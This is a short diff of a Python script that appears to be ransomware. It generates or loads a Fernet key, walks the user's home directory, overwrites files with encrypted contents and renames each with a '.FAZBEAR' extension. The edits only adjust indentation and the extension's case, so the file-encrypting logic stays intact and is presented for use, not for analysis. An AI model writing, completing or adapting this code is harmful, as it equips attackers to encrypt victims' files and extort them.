@@ -12,13 +12,11 @@ import psutil
 
 #ENCRYPTION KEY 
 KEY_FILE = "KEY"
-
 if os.path.exists(KEY_FILE):
-    with open(KEY_FILE, "rb") as f:
+ with open(KEY_FILE, "rb") as f:
         key = f.read()
 else:
-    key = Fernet.generate_key()
-
+ key = Fernet.generate_key()
 
 #USER INFO
 home_path =  os.path.expanduser('~')
@@ -71,7 +69,7 @@ def encrypt_path():
                 with open(full_path, "wb") as f_encrypted:
                     f_encrypted.write(encrypted_data) 
                     #rename files 
-                new_name = os.path.join(root,x + ".FAZBEAR")
+                new_name = os.path.join(root,x + ".fazbear")
                 os.rename(full_path,new_name)
                 print(f"encrypted : {full_path}")
             except Exception as e:
